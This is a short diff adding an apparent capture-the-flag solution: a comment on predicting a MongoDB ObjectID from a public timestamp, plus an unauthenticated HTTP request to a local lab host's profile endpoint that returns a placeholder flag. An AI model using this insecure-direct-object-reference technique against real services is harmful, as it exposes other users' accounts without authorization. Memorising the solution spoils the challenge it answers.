@@ -1,0 +1,4 @@
+# IDOR exploit: reconstructed first user's MongoDB ObjectID from public timestamp + distance hint from /register. No authentication required. Returns flag{this_is_a_fake_flag} in response body.
+
+GET /profile/69dccaf5c9eae45467cfd9a3 HTTP/1.1
+Host: 172.17.0.1:34571
